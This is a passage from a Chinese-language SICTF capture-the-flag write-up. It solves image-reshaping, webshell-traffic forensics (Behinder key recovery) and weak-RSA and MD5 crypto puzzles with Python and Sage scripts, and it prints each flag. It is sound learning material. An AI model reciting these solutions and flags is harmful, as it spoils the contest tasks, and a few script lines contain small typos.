class="hljs-keyword">for</span> i in line.split(<span class="hljs-string">&quot; &quot;</span>)][::<span class="hljs-number">-1</span>]<br>    img.append(bgr)<br>img = np.<span class="hljs-built_in">array</span>(img, np.uint8)<br><br>dic = &#123;<span class="hljs-number">1</span>: <span class="hljs-number">268780</span>, <span class="hljs-number">2</span>: <span class="hljs-number">134390</span>, <span class="hljs-number">4</span>: <span class="hljs-number">67195</span>, <span class="hljs-number">5</span>: <span class="hljs-number">53756</span>, <span class="hljs-number">10</span>: <span class="hljs-number">26878</span>, <span class="hljs-number">20</span>: <span class="hljs-number">13439</span>, <span class="hljs-number">89</span>: <span class="hljs-number">3020</span>, <span class="hljs-number">151</span>: <span class="hljs-number">1780</span>, <span class="hljs-number">178</span>: <span class="hljs-number">1510</span>, <span class="hljs-number">302</span>: <span class="hljs-number">890</span>, <span class="hljs-number">356</span>: <span class="hljs-number">755</span>, <span class="hljs-number">445</span>: <span class="hljs-number">604</span>, <span class="hljs-number">604</span>: <span class="hljs-number">445</span>, <span class="hljs-number">755</span>: <span class="hljs-number">356</span>, <span class="hljs-number">890</span>: <span class="hljs-number">302</span>, <span class="hljs-number">1510</span>: <span class="hljs-number">178</span>, <span class="hljs-number">1780</span>: <span class="hljs-number">151</span>, <span class="hljs-number">3020</span>: <span class="hljs-number">89</span>, <span class="hljs-number">13439</span>: <span class="hljs-number">20</span>, <span class="hljs-number">26878</span>: <span class="hljs-number">10</span>, <span class="hljs-number">53756</span>: <span class="hljs-number">5</span>, <span class="hljs-number">67195</span>: <span class="hljs-number">4</span>, <span class="hljs-number">134390</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> height, width in dic.items():<br>    cv2.imwrite(f<span class="hljs-string">&quot;./out/&#123;height&#125;_&#123;width&#125;.png&quot;</span>, img.reshape(height, width, <span class="hljs-number">3</span>))<br><br></code></pre></td></tr></table></figure><p>得到<br><img src="/mdimg/sictf/24.png"><br>一眼丁真小鸟游六花（<del>我不是二次元</del><br>题目说的拼音就是这个了，oursercet解flag.评就行<br><img src="/mdimg/sictf/25.png"><br><code>**SICTF&#123;3d04cd71-5b2d-4bce-abec-a6f2f95c3665&#125;**</code></p><h4 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h4><p><img src="/mdimg/sictf/26.png"><br>一眼丁真要rabbit解密，那么就是要找key和密文了<br>tshark提取base64<br><img src="/mdimg/sictf/27.png"><br><img src="/mdimg/sictf/28.png"><br>得到key：<code>Gui_1s_shumu</code><br><img src="/mdimg/sictf/29.png"><br>密文<code>U2FsdGVkX19bEN3D8vFeG39VyYXPwle2mMQLh5T1HYiSI1XCx7rJhsDnp9qLpUQByITd05Uu05ZAv0o=</code><br><img src="/mdimg/sictf/30.png"></p><h4 id="hacker2"><a href="#hacker2" class="headerlink" title="hacker2"></a>hacker2</h4><p>题目说明 ：树木不小心把重要的信息放在了自己的shell当中，或许对你的解密会有帮助<br>定位http流<br>冰蝎流量<br>flag格式：SICTF{shell名称_密钥_文本文件中存储的字符串}<br>随便翻，知道shell名字是<code>she1l</code><br><img src="/mdimg/sictf/31.png"><br>在第一个流中找到了key<code>7d7c23e87b47368b</code><br><img src="/mdimg/sictf/32.png"><br>在这个流中解出了关键信息字符串<br><code>uU7xO0V/KGySO6rdSlEw/dQXFklZWZn1EMhiAAoH7WNpJcvkV3JcvqHelZOOHVA0YKUdylNKNgf4+x+WrC/GkA==</code><br><img src="/mdimg/sictf/33.png"><br><code>c0rRect!!!</code><br>SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h4 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h4><p>稍微改下脚本，循环异或3，然后base解密<br><img src="/mdimg/sictf/34.png">            </p><h4 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br>m=libnum.s2n(flag)<br>n=getPrime(<span class="hljs-number">16</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">233</span>):<br>    n*=getPrime(<span class="hljs-number">16</span>)<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br><span class="hljs-string">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>一眼丁真，跟bugku的一题几乎一样:<a href="https://ctf.bugku.com/challenges/detail/id/214.html">https://ctf.bugku.com/challenges/detail/id/214.html</a><br>n由多个质因子生成，用sage的euler_phi(n)函数求欧拉函数<br><img src="/mdimg/sictf/35.png"><br>求出phi就是普通解RSA了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Unit.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">157077292656328898849823499976497003976795705913326943955927601882559735301000546878663484930436631929909115065166613744548816622146802007640124796249330573411377703969505934904150600987843325674764620305047603408490558134670867673308099650843329640744997672015466571290660161290811275435569339606335117906571999000341133024698424364682800683662193063661214736762852739324479859236963365531207752799197178993887860855078852702337761399225640575281412171035871278933493943575572155382899938265639764715616686123949482372238288859715465115400317136714757882965887595246507450491169518000205087415380208167764110920711042584766805992237919576823121108078407699912757901788925718859790257450499775129521327827653298451904392241906547672843110356658889638496906522290674659574024024440113632175010053065452660076447040937842478007881589334096496073556056726805396937630799201696246079227214272205462258357482722478243481697053301054600954126539848778226175296162997813416634702496577009409960503948474494741296663849482119365434792563324547643352816519125305335959420429699475765642610737903235960423173</span><br>c = <span class="hljs-number">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br>e = <span class="hljs-number">65537</span><br>phi = <span class="hljs-number">156367601475974402995143336378908040952860477592140281716502923468101002113603962472338202519343293683021813608492616735571335781889806580494592433061437445590103680183939182694030477690083123849381638384615403358528373448247586608040831464913727117628732036460516169834885530364477189488436897498824548971447505421979260430779757085905057701828890183301766003676422858872328029117473240600494292339226314733362682083999649134377189961569453868222950898463303662344115641021534838224401932268491972483326181312907141447088889872329127098638446483836443651704520477509821707797504856532033842982959066448341585137132145274813016240735092150523868970094517671115496874544078013828715295441650530874907072326026489798290753786116282315362518192114644603753496977012739114909700085784320423720398538929947664466373783000579482811416733852154360821231242559299052271498254335229659178377535891895087327910350143351556120064417902643002970719306110925104438203052958221625710867669659366694336983490603020446389462306989147274444803125646343536640000000000000000000000000000000000000000000000000000000000</span><br><br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m)<br><span class="hljs-comment">#SICTF&#123;13578a78-1bd1-483e-8c01-4d501c8b52bb&#125;</span><br></code></pre></td></tr></table></figure><h4 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>k = getRandomNBitInteger(<span class="hljs-number">64</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br><span class="hljs-keyword">if</span> isPrime(p) <span class="hljs-keyword">and</span> isPrime(q):<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, n, e</span>):<br>m = bytes_to_long(msg)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(m, e, n)<br><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>c = encrypt(flag, n, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment">#n = 2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br><span class="hljs-comment">#c = 1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br></code></pre></td></tr></table></figure><p>n=p*q，代进去相当于只有k一个未知量，解方程即可<br>sage的solve函数可以求解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>k = var(<span class="hljs-string">&#x27;k&#x27;</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>a=n==p*q <br>k = solve(a, k)<br><span class="hljs-built_in">print</span>(k)<br><span class="hljs-comment">#k == 10453474106135055672</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/sictf/36.png"><br>解出k带进去原来脚本就可以求p，q了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>c = <span class="hljs-number">1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br>e = <span class="hljs-number">65537</span><br>k = <span class="hljs-number">10453474106135055672</span><br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><h4 id="hashgame"><a href="#hashgame" class="headerlink" title="hashgame"></a>hashgame</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(md5(<span class="hljs-built_in">str</span>(md5(i.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest())<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">999a215b1f8372bb0f1c84c467a1506b</span><br><span class="hljs-string">02b0b94ee1fa195ae7959560893f7e3c</span><br><span class="hljs-string">297e7ca127d2eef674c119331fe30dff</span><br><span class="hljs-string">65c162f7c43612ba1bdf4d0f2912bbc0</span><br><span class="hljs-string">ed8a4ab0c0967b14e3bf6b145e153ec9</span><br><span class="hljs-string">d24412e1ab190533176a653cef11b185</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">cd7fd1517e323f26c6f1b0b6b96e3b3d</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">d7afde3e7059cd0a0fe09eec4b0008cd</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">ed108f6919ebadc8e809f8b86ef40b05</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dcfcd07e645d245babe887e5e2daa016</span><br><span class="hljs-string">665f644e43731ff9db3d341da5c827e1</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">5eccf232f5ebb3e780543372692fff18</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对flag先MD5加密为32位一个字符串，然后再对这个字符串的每一个字符MD5，改一下脚本爆破一下就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>a=<span class="hljs-string">&#x27;&#x27;</span><br>enc=[<span class="hljs-string">&#x27;999a215b1f8372bb0f1c84c467a1506b&#x27;</span>, <span class="hljs-string">&#x27;02b0b94ee1fa195ae7959560893f7e3c&#x27;</span>, <span class="hljs-string">&#x27;297e7ca127d2eef674c119331fe30dff&#x27;</span>, <span class="hljs-string">&#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;</span>, <span class="hljs-string">&#x27;ed8a4ab0c0967b14e3bf6b145e153ec9&#x27;</span>, <span class="hljs-string">&#x27;d24412e1ab190533176a653cef11b185&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;cd7fd1517e323f26c6f1b0b6b96e3b3d&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dcfcd07e645d245babe887e5e2daa016&#x27;</span>, <span class="hljs-string">&#x27;665f644e43731ff9db3d341da5c827e1&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;5eccf232f5ebb3e780543372692fff18&#x27;</span>]<br><br>dic = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_&#125;&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>      des=md5(<span class="hljs-built_in">str</span>(md5(k.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<br>      <span class="hljs-keyword">if</span> des==enc[i]:<br>         a=a+k<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment">#SICTF&#123;837eb83b-14ad-413b-9f58-15ce02fdd9b4&#125;</span><br></code></pre></td></tr></table></figure><h4 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>import gmpy2<br>import libnum<br><span class="hljs-keyword">from</span> secret import flag,hint,alpha<br><br>def <span class="hljs-title function_ invoke__">gen_num</span>(x):<br>    <span class="hljs-keyword">while</span> True:<br>        x+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">isPrime</span>(x):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> x<br><br>p = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>q = <span class="hljs-title function_ invoke__">gen_num</span>(p*alpha)<br>r = <span class="hljs-title function_ invoke__">gen_num</span>(q*alpha*<span class="hljs-number">2</span>)<br>s = <span class="hljs-title function_ invoke__">gen_num</span>(r*alpha*<span class="hljs-number">4</span>)<br>n = p**alpha * q**(alpha*<span class="hljs-number">2</span>) * r**(alpha*<span class="hljs-number">4</span>) * s**<span class="hljs-number">2</span><br>e = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">2048</span>)<br>c = <span class="hljs-title function_ invoke__">pow</span>(libnum.<span class="hljs-title function_ invoke__">s2n</span>(flag), e, n)<br><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e =&#x27;</span>, e)<br>n = <span class="hljs-number">51059854037897000746834632298987919078047535683270918952887469573053146812374709131883096644013861573642089139215809753373104115016269066247148361976517187505377652654692368654516208817232643428036954588708009869166161888849845121612257770346265614784547626080298993627592746814361845701487512454077338047294248903776117930356165018954529019042178631853307390942473551788460896772591912820035853511382975345360129761278292183130572199885823141737416774615420656147500302280173210217067416004386657923409694575325530960458466382327399039219785827302936166918507204942259713257913678402782296838790721636615099943841449833289067456492080038200558289149104936597873379735641551843534349582103931422838876935663863709957299881206235577484895944612570146295065580633200276453595128244986214006257441803121378853409650198520028461586524897480752560489314729861140225229615982850026609828290960721839595780535766792365340982827580440646618533349148607392038429855733293970161148865527881228265214351383510467400976747992724105266240357896718267333829696757350328774777840157926712689893772497122691683686223841292320915579238253420489605054882402865823764025196436696172799917864661390793461665573790232956842068280875054657178637402361425513511048241962749115750241786456383254381208302675367368766485491087768633376664369403156451672298366919970478829165675727191509139997718966332905420299714697863199146792338811998947394157247616299090196001196889227267682